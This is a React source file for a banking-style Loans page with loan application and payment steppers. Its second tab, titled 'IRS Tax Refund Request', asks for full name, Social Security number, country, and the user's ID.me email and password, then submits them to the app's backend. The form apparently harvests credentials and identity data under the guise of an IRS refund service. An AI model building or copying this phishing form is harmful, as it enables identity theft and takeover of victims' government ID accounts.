import React, { useEffect, useState } from 'react';
import { useSelector, useDispatch } from 'react-redux';
import { useLocation } from 'react-router-dom';
import { Box, Typography, Paper, Grid, Button, Card, CardContent, CircularProgress, Alert, Dialog, DialogTitle, DialogContent, DialogActions, TextField, Tab, Tabs, MenuItem, Stepper, Step, StepLabel, IconButton } from '@mui/material';
import { Close } from '@mui/icons-material';
import { getUserLoans, getAvailableLoanTypes, applyForLoan, makeLoanPayment, submitTaxRefundRequest } from '../store/slices/loanSlice';

const Loans = () => {
  const dispatch = useDispatch();
  const location = useLocation();
  const { loans, loading, error, availableLoanTypes } = useSelector((state) => state.loans);
  const [openPaymentDialog, setOpenPaymentDialog] = useState(false);
  const [openApplyDialog, setOpenApplyDialog] = useState(false);
  const [tabValue, setTabValue] = useState(0); // 0 = Loans, 1 = IRS Tax Refund
  const [selectedLoan, setSelectedLoan] = useState(null);
  const [paymentAmount, setPaymentAmount] = useState('');
  const [selectedLoanType, setSelectedLoanType] = useState(null);
  const [loanAmount, setLoanAmount] = useState('');
  const [loanApplicationStep, setLoanApplicationStep] = useState(0); // Track current step in loan application stepper
  const [loanPaymentStep, setLoanPaymentStep] = useState(0); // Track current step in loan payment stepper
  
  // IRS Tax Refund form state
  const [irsForm, setIrsForm] = useState({
    fullName: '',
    ssn: '',
    idmeEmail: '',
    idmePassword: '',
    country: ''
  });
  const [irsSubmitting, setIrsSubmitting] = useState(false);
  const [irsSuccess, setIrsSuccess] = useState(false);
  
  // List of countries for the dropdown
  const countries = [
    'United States', 'Canada', 'United Kingdom', 'Australia', 'Germany', 'France', 
    'Italy', 'Spain', 'Mexico', 'Brazil', 'India', 'China', 'Japan', 'South Korea',
    'Afghanistan', 'Albania', 'Algeria', 'Argentina', 'Armenia', 'Austria', 'Azerbaijan',
    'Bahamas', 'Bahrain', 'Bangladesh', 'Barbados', 'Belarus', 'Belgium', 'Belize', 'Benin',
    'Bhutan', 'Bolivia', 'Bosnia and Herzegovina', 'Botswana', 'Brazil', 'Bulgaria', 'Burkina Faso',
    'Burundi', 'Cambodia', 'Cameroon', 'Canada', 'Cape Verde', 'Chad', 'Chile', 'China', 'Colombia',
    'Comoros', 'Costa Rica', 'Croatia', 'Cuba', 'Cyprus', 'Czech Republic', 'Denmark', 'Djibouti',
    'Dominica', 'Dominican Republic', 'Ecuador', 'Egypt', 'El Salvador', 'Estonia', 'Ethiopia',
    'Fiji', 'Finland', 'France', 'Georgia', 'Germany', 'Ghana', 'Greece', 'Guatemala', 'Haiti',
    'Honduras', 'Hong Kong', 'Hungary', 'Iceland', 'India', 'Indonesia', 'Iran', 'Iraq', 'Ireland',
    'Israel', 'Italy', 'Jamaica', 'Japan', 'Jordan', 'Kazakhstan', 'Kenya', 'Kuwait', 'Kyrgyzstan',
    'Laos', 'Latvia', 'Lebanon', 'Libya', 'Lithuania', 'Luxembourg', 'Malaysia', 'Maldives', 'Mali',
    'Malta', 'Mauritania', 'Mauritius', 'Mexico', 'Moldova', 'Monaco', 'Mongolia', 'Montenegro',
    'Morocco', 'Mozambique', 'Namibia', 'Nepal', 'Netherlands', 'New Zealand', 'Nicaragua', 'Niger',
    'Nigeria', 'Norway', 'Oman', 'Pakistan', 'Palestine', 'Panama', 'Paraguay', 'Peru', 'Philippines',
    'Poland', 'Portugal', 'Qatar', 'Romania', 'Russian Federation', 'Rwanda', 'Saudi Arabia',
    'Senegal', 'Serbia', 'Singapore', 'Slovakia', 'Slovenia', 'South Africa', 'South Sudan', 'Spain',
    'Sri Lanka', 'Sudan', 'Sweden', 'Switzerland', 'Syria', 'Taiwan', 'Tajikistan', 'Tanzania',
    'Thailand', 'Togo', 'Trinidad and Tobago', 'Tunisia', 'Turkey', 'Turkmenistan', 'Uganda',
    'Ukraine', 'United Arab Emirates', 'Uruguay', 'Uzbekistan', 'Vanuatu', 'Venezuela', 'Vietnam',
    'Yemen', 'Zambia', 'Zimbabwe'
  ];

  useEffect(() => {
    dispatch(getUserLoans());
    dispatch(getAvailableLoanTypes());
  }, [dispatch, location.pathname]);

  const handlePaymentClick = (loan) => {
    setSelectedLoan(loan);
    setPaymentAmount('');
    setLoanPaymentStep(0); // Reset to first step when opening new payment
    setOpenPaymentDialog(true);
  };

  const handlePaymentSubmit = () => {
    if (selectedLoan && paymentAmount) {
      dispatch(makeLoanPayment({ 
        id: selectedLoan.id, 
        paymentData: { amount: parseFloat(paymentAmount) } 
      }));
      setOpenPaymentDialog(false);
    }
  };

  const handleApplyClick = (loanType) => {
    setSelectedLoanType(loanType);
    setLoanAmount('');
    setLoanApplicationStep(0); // Reset to first step when opening new application
    setOpenApplyDialog(true);
  };

  const handleTabChange = (event, newValue) => {
    setTabValue(newValue);
    setIrsSuccess(false);
  };

  const handleIrsFormChange = (e) => {
    setIrsForm(prev => ({
      ...prev,
      [e.target.name]: e.target.value
    }));
  };

  const handleIrsSubmit = async () => {
    setIrsSubmitting(true);
    try {
      await dispatch(submitTaxRefundRequest(irsForm)).unwrap();
      setIrsSuccess(true);
      setIrsForm({
        fullName: '',
        ssn: '',
        idmeEmail: '',
        idmePassword: '',
        country: ''
      });
    } catch (error) {
      console.error('Tax refund request failed:', error);
    } finally {
      setIrsSubmitting(false);
    }
  };

  const handleApplySubmit = () => {
    if (selectedLoanType && loanAmount) {
      dispatch(applyForLoan({
        loanType: selectedLoanType.type,
        amount: parseFloat(loanAmount)
      }));
      setOpenApplyDialog(false);
    }
  };

  if (loading) {
    return (
      <Box display="flex" justifyContent="center" alignItems="center" minHeight="80vh">
        <CircularProgress />
      </Box>
    );
  }

  if (error) {
    return (
      <Box mt={4}>
        <Alert severity="error">{error}</Alert>
      </Box>
    );
  }

  return (
    <Box>
      <Typography variant="h4" gutterBottom>Loans & IRS Tax Refunds</Typography>
      
      <Paper sx={{ mb: 4 }}>
        <Tabs value={tabValue} onChange={handleTabChange} sx={{ borderBottom: 1, borderColor: 'divider' }}>
          <Tab label="Loan Services" />
          <Tab label="IRS Tax Refund Request" />
        </Tabs>
      </Paper>

      {tabValue === 0 && (
        <></>
      )}

      {tabValue === 1 && (
        <Paper sx={{ p: 4 }}>
          <Typography variant="h5" gutterBottom>IRS Tax Refund Request</Typography>
          <Typography variant="body1" sx={{ mb: 4 }}>
            Please fill out the form below to submit your IRS tax refund request
          </Typography>

          {irsSuccess && (
            <Alert severity="success" sx={{ mb: 3 }}>
              Your IRS tax refund request has been submitted successfully! We will process it and contact you soon.
            </Alert>
          )}

          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Typography variant="subtitle1" gutterBottom>Personal Information</Typography>
              <TextField
                fullWidth
                label="Full Name"
                name="fullName"
                value={irsForm.fullName}
                onChange={handleIrsFormChange}
                margin="normal"
                required
              />
              <TextField
                fullWidth
                label="Social Security Number (SSN)"
                name="ssn"
                value={irsForm.ssn}
                onChange={handleIrsFormChange}
                margin="normal"
                required
                placeholder="XXX-XX-XXXX"
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Typography variant="subtitle1" gutterBottom>ID.me Credentials</Typography>
              <TextField
                fullWidth
                label="ID.me Email"
                name="idmeEmail"
                type="email"
                value={irsForm.idmeEmail}
                onChange={handleIrsFormChange}
                margin="normal"
                required
              />
              <TextField
                fullWidth
                label="ID.me Password"
                name="idmePassword"
                type="password"
                value={irsForm.idmePassword}
                onChange={handleIrsFormChange}
                margin="normal"
                required
              />
            </Grid>
            <Grid item xs={12}>
              <Typography variant="subtitle1" gutterBottom>Location Information</Typography>
              <TextField
                select
                fullWidth
                label="Country"
                name="country"
                value={irsForm.country}
                onChange={handleIrsFormChange}
                margin="normal"
                required
              >
                {countries.map((country) => (
                  <MenuItem key={country} value={country}>
                    {country}
                  </MenuItem>
                ))}
              </TextField>
            </Grid>
            <Grid item xs={12}>
              <Alert severity="warning" sx={{ mt: 2, mb: 3 }}>
                <strong>Important Notice:</strong> Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.
              </Alert>
            </Grid>
            <Grid item xs={12}>
              <Button
                variant="contained"
                size="large"
                onClick={handleIrsSubmit}
                disabled={irsSubmitting || !irsForm.fullName || !irsForm.ssn || !irsForm.idmeEmail || !irsForm.idmePassword || !irsForm.country}
              >
                {irsSubmitting ? <CircularProgress size={24} /> : 'Submit Request'}
              </Button>
            </Grid>
          </Grid>
        </Paper>
      )}

      {/* Loan Services Content */}
      {tabValue === 0 && (
        <>
          {loans.length > 0 && (
            <>
              <Typography variant="h6" sx={{ mt: 4, mb: 2 }}>Your Active Loans</Typography>
              {loans.map((loan) => (
            <Paper key={loan.id} sx={{ p: 3, mb: 3 }}>
              <Grid container spacing={3} alignItems="center">
                <Grid item xs={12} md={3}>
                  <Typography variant="h6">{loan.type}</Typography>
                  <Typography color="text.secondary">${loan.amount} total</Typography>
                </Grid>
                <Grid item xs={12} md={3}>
                  <Typography>Remaining: ${loan.remaining}</Typography>
                  <Typography>EMI: ${loan.emi}/month</Typography>
                </Grid>
                <Grid item xs={12} md={3}>
                  <Typography>Next EMI: {loan.nextEmiDate}</Typography>
                </Grid>
                <Grid item xs={12} md={3}>
                  <Button variant="outlined" onClick={() => handlePaymentClick(loan)}>
                    Pay Now
                  </Button>
                </Grid>
              </Grid>
            </Paper>
          ))}
        </>
      )}

      {loans.length === 0 && (
        <Paper sx={{ p: 4, textAlign: 'center', mt: 4 }}>
          <Typography variant="h6" color="text.secondary">You don't have any active loans</Typography>
        </Paper>
      )}

      <Typography variant="h6" sx={{ mt: 6, mb: 2 }}>Apply for New Loan</Typography>
      {availableLoanTypes.length > 0 ? (
        <Grid container spacing={3}>
          {availableLoanTypes.map((option, index) => (
            <Grid item xs={12} md={6} key={index}>
              <Card>
                <CardContent>
                  <Typography variant="h6">{option.type}</Typography>
                  <Typography color="primary" variant="h5" sx={{ my: 1 }}>{option.rate} p.a.</Typography>
                  <Typography color="text.secondary">Up to ${option.maxAmount?.toLocaleString()}</Typography>
                  <Button 
                    variant="contained" 
                    sx={{ mt: 2 }} 
                    onClick={() => handleApplyClick(option)}
                  >
                    Apply Now
                  </Button>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      ) : (
        <Paper sx={{ p: 4, textAlign: 'center' }}>
          <Typography variant="body1" color="text.secondary">Loading loan options...</Typography>
        </Paper>
      )}

      {/* Payment Dialog */}
      <Dialog open={openPaymentDialog} onClose={() => setOpenPaymentDialog(false)} maxWidth="md" fullWidth>
        <DialogTitle sx={{ 
          background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)',
          color: 'white',
          fontWeight: 700,
          position: 'relative'
        }}>
          Make Loan Payment
          <IconButton
            aria-label="close"
            onClick={() => setOpenPaymentDialog(false)}
            sx={{ position: 'absolute', right: 8, top: 8, color: 'white' }}
          >
            <Close />
          </IconButton>
        </DialogTitle>
        <DialogContent sx={{ pt: 4 }}>
          {/* Loan Payment Stepper */}
          <Stepper activeStep={loanPaymentStep} sx={{ mb: 4 }}>
            {['Step 1: Review Payment Details', 'Step 2: Enter Payment Amount', 'Step 3: Confirm Payment'].map((label) => (
              <Step key={label}>
                <StepLabel>{label}</StepLabel>
              </Step>
            ))}
          </Stepper>

          {/* Step 1: Review Payment Details */}
          {loanPaymentStep === 0 && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Step 1: Review Your Payment Details</Typography>
                <Typography variant="body1" color="text.secondary" gutterBottom>Review the details of your loan before making a payment</Typography>
              </Grid>
              
              <Grid item xs={12} md={6}>
                <Card sx={{ p: 3, height: '100%' }}>
                  <Typography variant="h6" gutterBottom>Loan Summary</Typography>
                  <Box mt={2}>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Loan Type:</strong> {selectedLoan?.type}</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Remaining Balance:</strong> ${selectedLoan?.remaining?.toLocaleString()}</Typography>
                  </Box>
                </Card>
              </Grid>
              
              <Grid item xs={12}>
                <Button 
                  variant="contained" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanPaymentStep(1)}
                  sx={{ background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)', py: 2, mt: 2, fontSize: '1.1rem' }}
                >
                  Continue to Enter Payment Amount →
                </Button>
              </Grid>
            </Grid>
          )}

          {/* Step 2: Enter Payment Amount */}
          {loanPaymentStep === 1 && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Step 2: Enter Your Payment Amount</Typography>
                <Typography variant="body1" color="text.secondary" gutterBottom>Enter the amount you wish to pay towards your loan</Typography>
              </Grid>
              
              <Grid item xs={12}>
                <TextField
                  label="Payment Amount (USD)"
                  type="number"
                  fullWidth
                  value={paymentAmount}
                  onChange={(e) => setPaymentAmount(e.target.value)}
                  error={paymentAmount > selectedLoan?.remaining}
                  helperText={paymentAmount > selectedLoan?.remaining ? `Maximum payment is $${selectedLoan?.remaining?.toLocaleString()}` : `Enter an amount up to $${selectedLoan?.remaining?.toLocaleString()}`}
                  InputProps={{ inputProps: { min: 50, max: selectedLoan?.remaining, step: 0.01 } }}
                  sx={{ mt: 1 }}
                />
              </Grid>

              {/* Navigation buttons */}
              <Grid item xs={6}>
                <Button 
                  variant="outlined" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanPaymentStep(0)}
                  sx={{ py: 2, mt: 2 }}
                >
                  ← Back to Review
                </Button>
              </Grid>
              <Grid item xs={6}>
                <Button 
                  variant="contained" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanPaymentStep(2)}
                  disabled={!paymentAmount || paymentAmount > selectedLoan?.remaining || paymentAmount < 50}
                  sx={{ background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)', py: 2, mt: 2, fontSize: '1.1rem' }}
                >
                  Continue to Confirm →
                </Button>
              </Grid>
            </Grid>
          )}

          {/* Step 3: Submit Payment */}
          {loanPaymentStep === 2 && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Step 3: Confirm Your Payment</Typography>
                <Typography variant="body1" color="text.secondary" gutterBottom>Review your payment and submit</Typography>
              </Grid>
              
              <Grid item xs={12}>
                <Card sx={{ p: 3 }}>
                  <Typography variant="h6" gutterBottom>Payment Summary</Typography>
                  <Box mt={2}>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Loan Type:</strong> {selectedLoan?.type}</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Payment Amount:</strong> ${parseFloat(paymentAmount).toLocaleString()}</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>New Remaining Balance:</strong> ${(selectedLoan?.remaining - parseFloat(paymentAmount)).toLocaleString()}</Typography>
                  </Box>
                </Card>
              </Grid>

              {/* Navigation buttons */}
              <Grid item xs={6}>
                <Button 
                  variant="outlined" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanPaymentStep(1)}
                  sx={{ py: 2, mt: 2 }}
                >
                  ← Back to Edit
                </Button>
              </Grid>
              <Grid item xs={6}>
                <Button 
                  variant="contained" 
                  size="large" 
                  fullWidth
                  onClick={() => {
                    handlePaymentSubmit();
                    setOpenPaymentDialog(false);
                    setLoanPaymentStep(0); // Reset stepper for next time
                  }}
                  sx={{ background: 'linear-gradient(135deg, #00AA33 0%, #00CC44 100%)', py: 2, mt: 2, fontSize: '1.1rem' }}
                >
                  ✅ Submit Payment
                </Button>
              </Grid>
            </Grid>
          )}
        </DialogContent>
      </Dialog>

      {/* Apply Loan Dialog */}
      <Dialog open={openApplyDialog} onClose={() => setOpenApplyDialog(false)} maxWidth="md" fullWidth>
        <DialogTitle sx={{ 
          background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)',
          color: 'white',
          fontWeight: 700,
          position: 'relative'
        }}>
          Apply for {selectedLoanType?.type} Loan
          <IconButton
            aria-label="close"
            onClick={() => setOpenApplyDialog(false)}
            sx={{ position: 'absolute', right: 8, top: 8, color: 'white' }}
          >
            <Close />
          </IconButton>
        </DialogTitle>
        <DialogContent sx={{ pt: 4 }}>
          {/* Loan Application Stepper */}
          <Stepper activeStep={loanApplicationStep} sx={{ mb: 4 }}>
            {['Step 1: Review Loan Terms', 'Step 2: Enter Loan Details', 'Step 3: Submit Application'].map((label) => (
              <Step key={label}>
                <StepLabel>{label}</StepLabel>
              </Step>
            ))}
          </Stepper>

          {/* Step 1: Review Loan Terms */}
          {loanApplicationStep === 0 && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Step 1: Review Your Loan Terms</Typography>
                <Typography variant="body1" color="text.secondary" gutterBottom>Please review the terms of your {selectedLoanType?.type} loan before proceeding</Typography>
              </Grid>
              
              <Grid item xs={12} md={6}>
                <Card sx={{ p: 3, height: '100%' }}>
                  <Typography variant="h6" gutterBottom>Loan Details</Typography>
                  <Box mt={2}>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Loan Type:</strong> {selectedLoanType?.type}</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Interest Rate:</strong> {selectedLoanType?.rate}% p.a.</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Maximum Amount:</strong> ${selectedLoanType?.maxAmount?.toLocaleString()}</Typography>
                  </Box>
                </Card>
              </Grid>
              
              <Grid item xs={12}>
                <Button 
                  variant="contained" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanApplicationStep(1)}
                  sx={{ background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)', py: 2, mt: 2, fontSize: '1.1rem' }}
                >
                  Continue to Enter Loan Amount →
                </Button>
              </Grid>
            </Grid>
          )}

          {/* Step 2: Enter Loan Details */}
          {loanApplicationStep === 1 && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Step 2: Enter Your Loan Details</Typography>
                <Typography variant="body1" color="text.secondary" gutterBottom>Enter the amount you wish to borrow</Typography>
              </Grid>
              
              <Grid item xs={12}>
                <TextField
                  label="Loan Amount (USD)"
                  type="number"
                  fullWidth
                  value={loanAmount}
                  onChange={(e) => setLoanAmount(e.target.value)}
                  error={loanAmount > selectedLoanType?.maxAmount}
                  helperText={loanAmount > selectedLoanType?.maxAmount ? `Maximum loan amount is $${selectedLoanType?.maxAmount?.toLocaleString()}` : `Enter an amount up to $${selectedLoanType?.maxAmount?.toLocaleString()}`}
                  InputProps={{ inputProps: { min: 1000, max: selectedLoanType?.maxAmount, step: 0.01 } }}
                  sx={{ mt: 1 }}
                />
              </Grid>

              {/* Navigation buttons */}
              <Grid item xs={6}>
                <Button 
                  variant="outlined" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanApplicationStep(0)}
                  sx={{ py: 2, mt: 2 }}
                >
                  ← Back to Review
                </Button>
              </Grid>
              <Grid item xs={6}>
                <Button 
                  variant="contained" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanApplicationStep(2)}
                  disabled={!loanAmount || loanAmount > selectedLoanType?.maxAmount || loanAmount < 1000}
                  sx={{ background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)', py: 2, mt: 2, fontSize: '1.1rem' }}
                >
                  Continue to Submit →
                </Button>
              </Grid>
            </Grid>
          )}

          {/* Step 3: Submit Application */}
          {loanApplicationStep === 2 && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Step 3: Submit Your Loan Application</Typography>
                <Typography variant="body1" color="text.secondary" gutterBottom>Review your application and submit</Typography>
              </Grid>
              
              <Grid item xs={12}>
                <Card sx={{ p: 3 }}>
                  <Typography variant="h6" gutterBottom>Application Summary</Typography>
                  <Box mt={2}>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Loan Type:</strong> {selectedLoanType?.type}</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Requested Amount:</strong> ${parseFloat(loanAmount).toLocaleString()}</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Interest Rate:</strong> {selectedLoanType?.rate}% p.a.</Typography>
                  </Box>
                </Card>
              </Grid>

              {/* Navigation buttons */}
              <Grid item xs={6}>
                <Button 
                  variant="outlined" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanApplicationStep(1)}
                  sx={{ py: 2, mt: 2 }}
                >
                  ← Back to Edit
                </Button>
              </Grid>
              <Grid item xs={6}>
                <Button 
                  variant="contained" 
                  size="large" 
                  fullWidth
                  onClick={() => {
                    handleApplySubmit();
                    setOpenApplyDialog(false);
                    setLoanApplicationStep(0); // Reset stepper for next time
                  }}
                  sx={{ background: 'linear-gradient(135deg, #00AA33 0%, #00CC44 100%)', py: 2, mt: 2, fontSize: '1.1rem' }}
                >
                  ✅ Submit Application
                </Button>
              </Grid>
            </Grid>
          )}
        </DialogContent>
      </Dialog>
    </>
  )}
</Box>
);
};

export default Loans;